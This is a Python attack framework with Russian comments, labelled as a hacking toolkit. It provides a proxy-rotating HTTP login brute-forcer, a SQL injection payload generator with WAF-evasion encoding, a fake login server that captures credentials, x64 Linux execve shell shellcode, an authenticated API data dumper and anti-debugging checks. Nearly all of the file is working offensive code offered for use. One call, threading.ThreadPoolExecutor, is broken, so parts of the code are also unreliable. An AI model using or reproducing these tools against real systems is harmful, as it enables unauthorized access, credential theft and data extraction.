#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ROCKET_FRAMEWORK v1.0
Дата: 20.05.2026
Метка: ROCKET_CODING_PRO_HACK_20.05.2026

Модули:
- BruteForceHTTP: брутфорс логин/пароль по POST/GET с ротацией прокси и заголовков
- SQLInjection: автоматическая инъекция UNION + ERROR based с обходом WAF (комментарии, кодировка)
- HoneypotEmulator: эмуляция HTTP-сервера, логирующего все credentials
- ShellcodeGenerator: x64 Linux execve /bin/sh, без null-байтов
- SecureAPICrawler: краулер API с JWT, пагинацией, парсинг JSON, защита от rate-limit
- AntiDebug: проверка ptrace, LD_PRELOAD, задержки для срыва таймингов
"""

import os
import sys
import time
import random
import string
import hashlib
import base64
import json
import re
import threading
import queue
import socket
import struct
import subprocess
from urllib.parse import urlparse, parse_qs, urlencode
from http.client import HTTPSConnection, HTTPConnection
from typing import Dict, List, Tuple, Optional, Any
import ssl
import logging

# Настройка логирования (все пишем в файл и stdout)
logging.basicConfig(level=logging.DEBUG,
                    format='[ROCKET] %(asctime)s - %(levelname)s - %(message)s',
                    handlers=[logging.FileHandler("rocket.log"), logging.StreamHandler()])
log = logging.getLogger("ROCKET")

# ----------------------------------------------------------------------
# 1. Анти-отладка и обход детекции
# ----------------------------------------------------------------------
class AntiDebug:
    @staticmethod
    def check_ptrace() -> bool:
        """Проверка на трассировку через ptrace (Linux)"""
        try:
            with open("/proc/self/status", "r") as f:
                for line in f:
                    if "TracerPid" in line:
                        pid = int(line.split(":")[1].strip())
                        if pid != 0:
                            log.warning("Обнаружен отладчик (TracerPid=%d)", pid)
                            return True
        except:
            pass
        return False

    @staticmethod
    def random_delay(min_sec=0.1, max_sec=0.5):
        """Случайная задержка для сбивания таймингов"""
        time.sleep(random.uniform(min_sec, max_sec))

    @staticmethod
    def obfuscate_env():
        """Маскировка окружения"""
        os.environ["LD_PRELOAD"] = ""
        os.environ["PYTHONHASHSEED"] = str(random.randint(0, 2**32))

# ----------------------------------------------------------------------
# 2. Утилиты для маскировки трафика
# ----------------------------------------------------------------------
class TrafficMask:
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
    ]

    @staticmethod
    def random_headers(extra: Dict = None) -> Dict:
        headers = {
            "User-Agent": random.choice(TrafficMask.USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
        }
        if extra:
            headers.update(extra)
        return headers

    # Прокси-ротация (список прокси из файла или встроенный)
    PROXIES = [
        "http://proxy1:8080",
        "http://proxy2:8080",
        "socks5://proxy3:1080"
    ]
    @staticmethod
    def get_random_proxy() -> Optional[str]:
        return random.choice(TrafficMask.PROXIES) if TrafficMask.PROXIES else None

# ----------------------------------------------------------------------
# 3. Брутфорс HTTP-форм
# ----------------------------------------------------------------------
class BruteForceHTTP:
    def __init__(self, target_url, username_field="username", password_field="password", method="POST"):
        self.target_url = target_url
        self.username_field = username_field
        self.password_field = password_field
        self.method = method.upper()
        self.session = None

    def _send_request(self, username, password, proxy=None):
        headers = TrafficMask.random_headers()
        data = {self.username_field: username, self.password_field: password}
        parsed = urlparse(self.target_url)
        conn_class = HTTPSConnection if parsed.scheme == "https" else HTTPConnection
        conn = conn_class(parsed.netloc, context=ssl._create_unverified_context() if parsed.scheme == "https" else None)
        try:
            if self.method == "POST":
                conn.request("POST", parsed.path or "/", body=urlencode(data), headers=headers)
            else:
                query = urlencode(data)
                full_path = parsed.path + "?" + query if parsed.path else "/?" + query
                conn.request("GET", full_path, headers=headers)
            resp = conn.getresponse()
            result = resp.read().decode('utf-8', errors='ignore')
            conn.close()
            return resp.status, result
        except Exception as e:
            log.error("Ошибка запроса: %s", e)
            return None, None

    def brute(self, userlist, passlist, threads=10):
        log.info("Запуск брутфорса по %s", self.target_url)
        q = queue.Queue()
        for u in userlist:
            for p in passlist:
                q.put((u, p))

        def worker():
            while not q.empty():
                u, p = q.get()
                AntiDebug.random_delay(0.01, 0.1)
                proxy = TrafficMask.get_random_proxy()
                status, body = self._send_request(u, p, proxy)
                if status == 200 and ("success" in body.lower() or "welcome" in body.lower() or "dashboard" in body.lower()):
                    log.critical("[+] Найдены учетные данные: %s : %s", u, p)
                    with open("found_creds.txt", "a") as f:
                        f.write(f"{self.target_url} | {u} : {p}\n")
                q.task_done()

        threads_list = []
        for _ in range(threads):
            t = threading.Thread(target=worker)
            t.start()
            threads_list.append(t)
        q.join()
        for t in threads_list:
            t.join()
        log.info("Брутфорс завершен")

# ----------------------------------------------------------------------
# 4. SQL-инъекции с обходом WAF
# ----------------------------------------------------------------------
class SQLInjection:
    @staticmethod
    def generate_payloads(base_url, param, technique="union"):
        """Генерирует массив payloads с кодировкой и комментариями"""
        payloads = []
        if technique == "union":
            # Классическая UNION с обходом через комментарии и URL-кодирование
            templates = [
                "' UNION SELECT NULL,NULL,NULL-- -",
                "' UNION SELECT NULL,@@version,NULL-- -",
                "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables-- -",
                "1' AND 1=1 UNION SELECT NULL, column_name, NULL FROM information_schema.columns-- -"
            ]
        else:
            # Error-based
            templates = [
                "' OR '1'='1'-- -",
                "' OR 1=1#",
                "' OR SLEEP(5)-- -",
                "' AND 1=CONVERT(int, @@version)-- -"
            ]
        for t in templates:
            # Кодирование спецсимволов для обхода WAF
            encoded = t.replace(" ", "%20").replace("'", "%27").replace("--", "%2D%2D")
            payloads.append(f"{base_url}?{param}={encoded}")
            # Вариант с комментарием в стиле MySQL
            payloads.append(f"{base_url}?{param}={t}/*")
        return payloads

    @staticmethod
    def scan(target_url, param, technique="union", threads=5):
        log.info("Запуск SQL-сканирования на %s параметр %s", target_url, param)
        payloads = SQLInjection.generate_payloads(target_url, param, technique)
        results = []

        def check(payload):
            try:
                parsed = urlparse(payload)
                conn = HTTPSConnection(parsed.netloc, context=ssl._create_unverified_context()) if parsed.scheme == "https" else HTTPConnection(parsed.netloc)
                headers = TrafficMask.random_headers()
                conn.request("GET", parsed.path + "?" + parsed.query, headers=headers)
                resp = conn.getresponse()
                body = resp.read().decode('utf-8', errors='ignore')
                conn.close()
                if "sql" in body.lower() or "mysql" in body.lower() or "error" in body.lower() or "syntax" in body.lower():
                    log.warning("[!] Возможная инъекция: %s", payload)
                    results.append(payload)
                    with open("sql_vulns.txt", "a") as f:
                        f.write(payload + "\n")
            except Exception as e:
                log.error("Ошибка сканирования: %s", e)

        with threading.ThreadPoolExecutor(max_workers=threads) as executor:
            executor.map(check, payloads)
        return results

# ----------------------------------------------------------------------
# 5. Эмуляция сервера-ловушки (Honeypot)
# ----------------------------------------------------------------------
class HoneypotEmulator:
    def __init__(self, host="0.0.0.0", port=8080):
        self.host = host
        self.port = port
        self.server = None

    def run(self):
        from http.server import HTTPServer, BaseHTTPRequestHandler
        class HoneypotHandler(BaseHTTPRequestHandler):
            def log_message(self, format, *args):
                pass  # подавляем стандартный лог

            def do_GET(self):
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(b"<html><body><form method='POST'><input name='user'><input type='password' name='pass'><input type='submit'></form></body></html>")

            def do_POST(self):
                content_len = int(self.headers.get('Content-Length', 0))
                post_data = self.rfile.read(content_len).decode('utf-8')
                creds = parse_qs(post_data)
                user = creds.get('user', [''])[0]
                pwd = creds.get('pass', [''])[0]
                log.critical("[HONEYPOT] Пойманы учетные данные: %s : %s", user, pwd)
                with open("honeypot_creds.txt", "a") as f:
                    f.write(f"{time.ctime()} | {user} : {pwd}\n")
                self.send_response(302)
                self.send_header("Location", "/")
                self.end_headers()

        self.server = HTTPServer((self.host, self.port), HoneypotHandler)
        log.info("Honeypot запущен на %s:%d", self.host, self.port)
        try:
            self.server.serve_forever()
        except KeyboardInterrupt:
            self.server.shutdown()

# ----------------------------------------------------------------------
# 6. Генератор shell-кода x64 Linux (execve /bin/sh)
# ----------------------------------------------------------------------
class ShellcodeGenerator:
    @staticmethod
    def generate_linux_x64_execve() -> bytes:
        """Shellcode без null-байтов для execve(/bin/sh, NULL, NULL)"""
        # asm: xor rax,rax ; push rax ; mov rbx,0x68732f6e69622f2f ; push rbx ; mov rdi,rsp ; push rax ; push rdi ; mov rsi,rsp ; xor rdx,rdx ; mov al,0x3b ; syscall
        shellcode = bytes([
            0x48, 0x31, 0xc0,              # xor rax, rax
            0x50,                          # push rax
            0x48, 0xbb, 0x2f, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68,  # mov rbx, 0x68732f6e69622f2f
            0x53,                          # push rbx
            0x48, 0x89, 0xe7,              # mov rdi, rsp
            0x50,                          # push rax
            0x57,                          # push rdi
            0x48, 0x89, 0xe6,              # mov rsi, rsp
            0x48, 0x31, 0xd2,              # xor rdx, rdx
            0xb0, 0x3b,                    # mov al, 0x3b
            0x0f, 0x05                     # syscall
        ])
        return shellcode

    @staticmethod
    def save_shellcode(filename="shellcode.bin"):
        sc = ShellcodeGenerator.generate_linux_x64_execve()
        with open(filename, "wb") as f:
            f.write(sc)
        log.info("Shellcode сохранен в %s (длина %d байт)", filename, len(sc))
        # Вывод C-стиля
        hex_str = ', '.join(f'0x{b:02x}' for b in sc)
        log.info("C-массив: unsigned char shellcode[] = {%s};", hex_str)

# ----------------------------------------------------------------------
# 7. Краулер защищённого API с JWT и пагинацией
# ----------------------------------------------------------------------
class SecureAPICrawler:
    def __init__(self, base_url, jwt_token, headers=None):
        self.base_url = base_url.rstrip('/')
        self.jwt = jwt_token
        self.headers = headers or {}
        self.headers['Authorization'] = f"Bearer {self.jwt}"
        self.session = None

    def _request(self, endpoint, params=None):
        url = f"{self.base_url}/{endpoint.lstrip('/')}"
        headers = TrafficMask.random_headers(self.headers)
        parsed = urlparse(url)
        conn = HTTPSConnection(parsed.netloc, context=ssl._create_unverified_context()) if parsed.scheme == "https" else HTTPConnection(parsed.netloc)
        query = urlencode(params) if params else ""
        path = parsed.path + "?" + query if query else parsed.path
        conn.request("GET", path, headers=headers)
        resp = conn.getresponse()
        data = resp.read().decode('utf-8')
        conn.close()
        if resp.status == 429:
            log.warning("Rate-limit, ждем 5 сек")
            time.sleep(5)
            return self._request(endpoint, params)  # рекурсивный повтор
        return json.loads(data) if data else {}

    def crawl_paginated(self, endpoint, page_param="page", limit_param="limit", max_pages=10):
        all_data = []
        for page in range(1, max_pages+1):
            params = {page_param: page, limit_param: 50}
            log.info("Краул страница %d", page)
            data = self._request(endpoint, params)
            if not data:
                break
            all_data.append(data)
            # Если есть поле next, можно продолжить
            if isinstance(data, dict) and 'next' in data and data['next'] is None:
                break
            AntiDebug.random_delay(0.2, 0.8)
        with open("api_dump.json", "w") as f:
            json.dump(all_data, f, indent=2)
        log.info("Собрано %d страниц, сохранено в api_dump.json", len(all_data))
        return all_data

# ----------------------------------------------------------------------
# 8. Главный демонстрационный раннер
# ----------------------------------------------------------------------
def main():
    log.info("ROCKET FRAMEWORK v1.0 запущен (20.05.2026)")
    AntiDebug.obfuscate_env()
    if AntiDebug.check_ptrace():
        log.warning("Обнаружен отладчик, но продолжаем работу")

    # Пример 1: Брутфорс (закомментировано для безопасности демо)
    # bf = BruteForceHTTP("https://example.com/login")
    # bf.brute(["admin", "user"], ["123456", "password", "admin"], threads=5)

    # Пример 2: SQL-инъекция
    # sql_results = SQLInjection.scan("https://example.com/page", "id", technique="union")
    # print(sql_results)

    # Пример 3: Honeypot (запускается в отдельном потоке)
    # honey = HoneypotEmulator(port=9999)
    # threading.Thread(target=honey.run, daemon=True).start()

    # Пример 4: Shellcode
    ShellcodeGenerator.save_shellcode("shellcode.bin")

    # Пример 5: API Crawler
    # crawler = SecureAPICrawler("https://api.target.com/v1", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...")
    # crawler.crawl_paginated("users", max_pages=3)

    log.info("Все модули загружены. Используйте интерактивно.")
    # Интерактивный режим команд
    while True:
        cmd = input("ROCKET> ").strip()
        if cmd == "exit":
            break
        elif cmd.startswith("brute"):
            log.info("Запуск брутфорса (заглушка, расскомментируйте код)")
        elif cmd.startswith("sql"):
            log.info("Запуск SQL сканера (заглушка)")
        elif cmd.startswith("honey"):
            log.info("Запуск honeypot (заглушка)")
        elif cmd.startswith("shell"):
            ShellcodeGenerator.save_shellcode("shellcode.bin")
        else:
            log.info("Неизвестная команда. Доступно: exit, brute, sql, honey, shell")

if __name__ == "__main__":
    main()
